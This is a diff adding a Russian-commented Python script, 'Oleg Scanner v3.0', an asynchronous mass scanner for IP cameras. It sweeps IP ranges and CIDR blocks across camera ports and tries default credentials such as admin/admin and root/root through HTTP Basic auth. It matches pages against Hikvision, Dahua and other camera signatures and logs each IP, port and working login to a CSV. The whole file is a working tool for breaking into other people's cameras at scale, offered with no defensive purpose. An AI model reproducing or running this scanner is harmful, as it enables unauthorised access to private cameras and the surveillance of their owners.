@@ -1,0 +1,185 @@
+
+#!/usr/bin/env python3
+"""
+Oleg Scanner v3.0 – идеальный асинхронный сканер камер.
+Улучшенная авторизация, расширенные креды, гибкие настройки.
+Использование:
+  python3 oleg_scanner_v3.py targets.txt [-t 500] [--timeout 1.5] [--resume old.csv] [--creds creds.txt] [--ports 80,554,8080]
+"""
+import asyncio, aiohttp, sys, os, ipaddress, time, argparse, re, base64, signal
+from datetime import datetime
+
+try:
+    from tqdm import tqdm
+    HAS_TQDM = True
+except:
+    HAS_TQDM = False
+
+# -------------------- НАСТРОЙКИ --------------------
+PORTS = [80, 81, 82, 88, 554, 8000, 8001, 8080, 8081, 8085, 8088, 8181, 37777]
+CREDS = [
+    ("admin", "admin"),
+    ("user", "user"),
+    ("guest", "guest"),
+    ("admin", "123456"),
+    ("admin", "password"),
+    ("admin", "admin12345"),
+    ("admin", ""),
+    ("root", "admin"),
+    ("root", "root"),
+    ("admin", "12345"),
+]
+SIGS = [
+    "easyn", "ipcamera", "webcam", "netcam", "snapshot.cgi", "videostream",
+    "mjpeg", "camera", "dahua", "hikvision", "onvif", "rtsp", "ip cam",
+    "WEB SERVICE", "login.asp", "DCS-", "alphapd", "xiongmai", "uniview",
+    "Dahua", "Hikvision"
+]
+DEFAULT_TIMEOUT = 1.5
+DEFAULT_WORKERS = 500
+# -----------------------------------------------
+
+found_lock = asyncio.Lock()
+found_cameras = []
+already_checked = set()
+
+def load_resume(resume_file):
+    if not resume_file or not os.path.exists(resume_file):
+        return
+    with open(resume_file, 'r') as f:
+        for line in f:
+            parts = line.strip().split(',')
+            if len(parts) >= 1:
+                already_checked.add(parts[0])
+
+def iter_targets(filepath):
+    with open(filepath, 'r') as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith('#'): continue
+            if '/' in line and ':' not in line:
+                try:
+                    net = ipaddress.ip_network(line, strict=False)
+                    for ip in net: yield str(ip)
+                except: pass
+            elif '-' in line and ':' not in line:
+                parts = line.split('-')
+                if len(parts) == 2:
+                    a, b = parts[0].strip(), parts[1].strip()
+                    try:
+                        start = int(ipaddress.IPv4Address(a))
+                        end = int(ipaddress.IPv4Address(b))
+                        while start <= end:
+                            yield str(ipaddress.IPv4Address(start))
+                            start += 1
+                    except: pass
+            else:
+                yield line
+
+def is_camera(text):
+    tlow = text.lower()
+    return any(sig.lower() in tlow for sig in SIGS)
+
+async def scan_ip(session, ip, output_file, timeout, semaphore, creds, ports):
+    async with semaphore:
+        if ip in already_checked:
+            return None
+        for port in ports:
+            for user, pwd in creds:
+                try:
+                    url = f"http://{ip}:{port}"
+                    auth_header = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+                    headers = {"Authorization": f"Basic {auth_header}"}
+                    async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            if is_camera(text):
+                                async with found_lock:
+                                    if ip not in already_checked:
+                                        already_checked.add(ip)
+                                        found_cameras.append((ip, port, user, pwd))
+                                        with open(output_file, 'a', encoding='utf-8') as f:
+                                            f.write(f"{ip},{port},{user},{pwd}\n")
+                                return (ip, port, user, pwd)
+                except:
+                    pass
+    return None
+
+async def main():
+    parser = argparse.ArgumentParser(description='Oleg Scanner v3.0')
+    parser.add_argument('targets', help='Файл с диапазонами IP')
+    parser.add_argument('-t', '--workers', type=int, default=DEFAULT_WORKERS, help='Число соединений')
+    parser.add_argument('--timeout', type=float, default=DEFAULT_TIMEOUT, help='Таймаут (сек)')
+    parser.add_argument('--resume', type=str, default='', help='Предыдущий CSV для пропуска')
+    parser.add_argument('--creds', type=str, default='', help='Файл с логинами:паролями')
+    parser.add_argument('--ports', type=str, default='', help='Список портов через запятую')
+    args = parser.parse_args()
+
+    if not os.path.exists(args.targets):
+        print(f"[-] Файл {args.targets} не найден"); sys.exit(1)
+
+    # Порты
+    ports = PORTS
+    if args.ports:
+        ports = [int(p.strip()) for p in args.ports.split(',') if p.strip().isdigit()]
+
+    # Креды
+    creds = CREDS
+    if args.creds and os.path.exists(args.creds):
+        creds = []
+        with open(args.creds, 'r') as f:
+            for line in f:
+                if ':' in line:
+                    u, p = line.strip().split(':', 1)
+                    creds.append((u, p))
+
+    # Resume
+    load_resume(args.resume)
+
+    out_file = f"oleg_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
+    with open(out_file, 'w', encoding='utf-8') as f:
+        f.write("IP,Port,Username,Password\n")
+
+    total_lines = sum(1 for line in open(args.targets) if line.strip() and not line.startswith('#'))
+    estimated = total_lines * 256
+    if HAS_TQDM:
+        pbar = tqdm(total=estimated, desc="Охота", unit="ip", ncols=80)
+    else:
+        pbar = None
+
+    semaphore = asyncio.Semaphore(args.workers)
+    connector = aiohttp.TCPConnector(limit=args.workers, limit_per_host=5, force_close=True)
+    timeout = aiohttp.ClientTimeout(total=args.timeout)
+
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for ip in iter_targets(args.targets):
+            task = asyncio.ensure_future(scan_ip(session, ip, out_file, args.timeout, semaphore, creds, ports))
+            tasks.append(task)
+            if len(tasks) >= args.workers * 2:
+                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                for t in done:
+                    res = await t
+                    if res and HAS_TQDM: tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
+                    if pbar: pbar.update(1)
+                tasks = list(pending)
+        for future in asyncio.as_completed(tasks):
+            res = await future
+            if res and HAS_TQDM: tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
+            if pbar: pbar.update(1)
+
+    if pbar: pbar.close()
+    print(f"\n[+] Готово! Найдено новых камер: {len(found_cameras)}")
+    print(f"[+] Результаты сохранены в {out_file}")
+
+if __name__ == "__main__":
+    try:
+        import uvloop
+        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+    except: pass
+    # Корректное завершение по Ctrl+C
+    def signal_handler(sig, frame):
+        print("\n[!] Прерывание, сохранение прогресса...")
+        sys.exit(0)
+    signal.signal(signal.SIGINT, signal_handler)
+    asyncio.run(main())
